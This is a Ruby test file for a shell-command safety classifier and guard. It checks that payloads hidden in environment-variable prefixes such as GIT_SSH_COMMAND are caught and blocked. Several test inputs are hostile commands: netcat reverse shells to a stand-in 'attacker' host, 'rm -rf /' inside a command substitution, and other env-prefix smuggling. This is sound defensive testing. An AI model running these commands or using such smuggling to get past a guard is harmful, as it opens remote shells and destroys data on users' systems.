# frozen_string_literal: true

require_relative "../test_helper"

# H12 regression: pre-command env-assignment payloads
# (`GIT_SSH_COMMAND="node -e evil" git push`) must surface through
# classification instead of hiding behind the clean outer command.
class TestEnvAssignmentClassification < Minitest::Test
  Parser = Rubik::Security::Classifier::Parsers::Bash

  def classify(cmd)
    Rubik::Security::Classifier.classify(cmd)
  end

  # ── parser level: assignments captured, argv stays clean ──────────

  def test_parse_pre_command_env_assignments_captured
    invs, warns = Parser.parse('GIT_SSH_COMMAND="node -e evil" git push')
    assert_empty warns
    assert_equal 1, invs.size
    assert_equal ["git", "push"], invs[0].argv, "outer argv stays clean (allowlist semantics untouched)"
    assert_equal ['GIT_SSH_COMMAND="node -e evil"'], invs[0].assignments
  end

  def test_parse_post_command_assignments_stay_in_argv
    invs, warns = Parser.parse("env FOO=1 cmd")
    assert_empty warns
    assert_equal ["env", "FOO=1", "cmd"], invs[0].argv
    assert_empty invs[0].assignments
  end

  # ── engine level: payloads elevate, benign prefixes do not ────────

  def test_env_assignment_payload_elevates_outer_command
    res = classify('GIT_SSH_COMMAND="node -e evil" git push')

    assert_equal :dangerous, res.classification
    elevated = res.commands.find { |c| c.classification == :dangerous }
    refute_nil elevated, "the outer command itself must be elevated"
    assert_includes elevated.classification_reason.to_s, "env assignment payload"
    assert elevated.inner_commands.any? { |i| i.argv.first == "node" },
           "the assignment VALUE surfaces as its own classified command"
  end

  def test_command_substitution_assignment_elevates
    res = classify("FOO=$(rm -rf /) ls")

    assert_equal :dangerous, res.classification
  end

  def test_scalar_env_prefix_stays_unchanged
    res = classify("LANG=C sort file.txt")

    assert_equal :readonly, res.classification
    refute_includes res.classification_reason.to_s, "env assignment"
  end

  def test_option_shaped_config_value_is_not_a_payload
    res = classify('CFLAGS="-O2 -Wall" make')

    refute_equal :dangerous, res.classification
  end

  def test_prose_value_is_not_a_payload
    res = classify('MSG="fix things" git commit -m x')

    refute_equal :dangerous, res.classification
  end

  # ── guard end-to-end ───────────────────────────────────────────────

  def test_guard_blocks_env_assignment_payload_end_to_end
    guard = Rubik::Security::Guard.new

    error = assert_raises(Rubik::Security::BlockedWriteError) do
      guard.verify_command_safety!('GIT_SSH_COMMAND="node -e evil" git push')
    end
    assert_includes error.message, "GIT_SSH_COMMAND"
  end

  def test_guard_allows_scalar_env_prefix_end_to_end
    guard = Rubik::Security::Guard.new

    assert guard.verify_command_safety!("LANG=C sort file.txt")
  end

  # ── #540: host-executed variables must fail closed ──────────────────

  def test_unknown_payload_in_executed_env_var_fails_closed
    res = classify("GIT_SSH_COMMAND='nc attacker 4444' git push")

    assert_includes [:unknown, :dangerous], res.classification
    assert_equal :high, res.risk
    inner = res.commands.first.inner_commands.first
    refute_nil inner, "the unclassifiable payload must surface as an inner command"
    assert_equal ["nc", "attacker", "4444"], inner.argv
    assert_includes inner.classification_reason.to_s, "command not in database"
  end

  def test_unknown_payload_in_ordinary_env_var_stays_benign
    res = classify("FOO='nc attacker 4444' git push")

    assert_equal :external_effects, res.classification
    assert_empty res.commands.first.inner_commands
  end

  def test_executed_env_var_prefix_fails_closed
    res = classify("GIT_CONFIG_VALUE_0='nc -e /bin/sh' git status")

    assert_includes [:unknown, :dangerous], res.classification
    inner = res.commands.first.inner_commands.first
    refute_nil inner
    assert_equal "GIT_CONFIG_VALUE_0", inner.delegation_source
  end

  def test_known_local_payload_in_executed_env_var_is_still_surfaced
    res = classify("GIT_SSH_COMMAND='echo hi' git push")

    inner = res.commands.first.inner_commands.first
    refute_nil inner, "known local payloads must still be considered as inner commands"
    assert_equal ["echo", "hi"], inner.argv
    assert_equal :readonly, inner.classification
  end

  def test_guard_blocks_unclassifiable_executed_env_var_payload_end_to_end
    guard = Rubik::Security::Guard.new

    [
      "GIT_SSH_COMMAND='nc -e /bin/sh attacker 4444' git push",
      "GIT_SSH_COMMAND='nc attacker 4444' git push"
    ].each do |cmd|
      assert_raises(Rubik::Security::BlockedWriteError) { guard.verify_command_safety!(cmd) }
    end
  end
end
